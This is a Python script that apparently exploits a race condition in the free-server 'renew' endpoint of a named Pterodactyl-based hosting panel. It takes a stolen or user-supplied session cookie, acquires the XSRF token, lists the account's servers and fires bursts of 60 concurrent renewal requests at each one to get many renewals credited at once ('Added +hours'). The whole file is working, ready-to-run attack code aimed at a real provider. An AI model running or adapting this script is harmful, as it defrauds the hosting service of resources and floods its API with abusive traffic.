import aiohttp
import asyncio
import sys
import random
import os
import json
from urllib.parse import unquote
from http.cookies import SimpleCookie

# === CONFIGURATION ===
BASE_URL = "https://gpanel.eternalzero.cloud"
RAW_COOKIE = os.environ.get("ETERNAL_COOKIE")

if not RAW_COOKIE:
    print("[!] FATAL: ETERNAL_COOKIE secret is missing.")
    sys.exit(1)

# === ATTACK SETTINGS ===
BURST_SIZE = 60
TIMEOUT = 15

# === GLOBAL STATE ===
# We store cookies here manually to ensure they don't get messed up
state = {
    'pterodactyl_session': '',
    'XSRF-TOKEN': ''
}

# Parse the user's input cookie
if "pterodactyl_session" in RAW_COOKIE:
    # User pasted full string
    temp = SimpleCookie()
    temp.load(RAW_COOKIE)
    if 'pterodactyl_session' in temp:
        state['pterodactyl_session'] = temp['pterodactyl_session'].value
else:
    # User pasted just the value
    state['pterodactyl_session'] = RAW_COOKIE.strip()

# === HELPERS ===
def build_cookie_header():
    # Construct the string manually: "key=value; key2=value2"
    c = f"pterodactyl_session={state['pterodactyl_session']}"
    if state['XSRF-TOKEN']:
        c += f"; XSRF-TOKEN={state['XSRF-TOKEN']}"
    return c

def get_headers(referer=None):
    h = {
        'authority': 'gpanel.eternalzero.cloud',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': BASE_URL,
        'x-requested-with': 'XMLHttpRequest',
        'cookie': build_cookie_header(),
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    
    # Add X-XSRF-TOKEN if we have it (Decoded)
    if state['XSRF-TOKEN']:
        h['X-XSRF-TOKEN'] = unquote(state['XSRF-TOKEN'])
    
    if referer:
        h['referer'] = referer
    else:
        # Default referer is usually required for CSRF checks
        h['referer'] = f"{BASE_URL}/"
        
    return h

# === STEP 1: PRIME COOKIES ===
async def prime_cookies(session):
    print("[*] Priming cookies (hitting dashboard)...")
    try:
        # Headers specifically for HTML
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'cookie': build_cookie_header()
        }
        
        async with session.get(BASE_URL, headers=headers) as resp:
            await resp.text() # Read body to ensure we get cookies
            
            # Manually extract Set-Cookie headers from the response
            # because aiohttp merges them sometimes.
            for cookie in session.cookie_jar:
                if cookie.key == 'XSRF-TOKEN':
                    state['XSRF-TOKEN'] = cookie.value
                if cookie.key == 'pterodactyl_session':
                    print("[!] Server rotated session cookie. Updating...")
                    state['pterodactyl_session'] = cookie.value

            if state['XSRF-TOKEN']:
                print(f"[+] XSRF-TOKEN Acquired: {state['XSRF-TOKEN'][:15]}...")
                return True
            else:
                print("[!] Failed to get XSRF-TOKEN. Check your ETERNAL_COOKIE.")
                return False

    except Exception as e:
        print(f"[!] Prime Error: {e}")
        return False

# === STEP 2: GET SERVER LIST ===
async def get_server_list(session):
    print("[*] Fetching server list...")
    try:
        # Explicitly passing the referer here!
        headers = get_headers(referer=f"{BASE_URL}/")
        
        async with session.get(f"{BASE_URL}/api/client", headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                servers = []
                for item in data['data']:
                    attr = item['attributes']
                    servers.append({
                        'name': attr['name'],
                        'uuid': attr['uuid'],
                        'short': attr['identifier']
                    })
                print(f"[+] Found {len(servers)} servers.")
                return servers
            else:
                print(f"[!] API Error {resp.status}: {await resp.text()}")
    except Exception as e:
        print(f"[!] List Error: {e}")
    return []

# === STEP 3: THE STORM ===
async def storm_server(session, server):
    target_url = f"{BASE_URL}/api/client/freeservers/{server['uuid']}/renew"
    print(f"\n[>>>] TARGET: {server['name']} ({server['short']})")
    
    headers = get_headers(referer=f"{BASE_URL}/server/{server['short']}")
    
    tasks = []
    for i in range(BURST_SIZE):
        tasks.append(fire_shot(session, target_url, headers))
    
    print(f"      FIRING {BURST_SIZE} REQUESTS...")
    results = await asyncio.gather(*tasks)
    
    hits = results.count(True)
    if hits > 0:
        print(f"[$$$] SUCCESS! Added +{hits * 4} Hours")
    else:
        print(f"[---] No Hits (Cooldown or Blocked)")

async def fire_shot(session, url, headers):
    try:
        # We manually constructed headers, so we don't need cookie_jar logic here
        async with session.post(url, json={}, headers=headers, params={'z': random.random()}) as resp:
            await resp.read()
            return resp.status in [200, 201]
    except:
        return False

# === MAIN ===
async def main():
    connector = aiohttp.TCPConnector(limit=0, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        
        if await prime_cookies(session):
            servers = await get_server_list(session)
            if servers:
                print("-" * 40)
                for server in servers:
                    await storm_server(session, server)
                    await asyncio.sleep(1) 
                print("-" * 40)
                print("[*] FLEET RENEWAL COMPLETE.")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
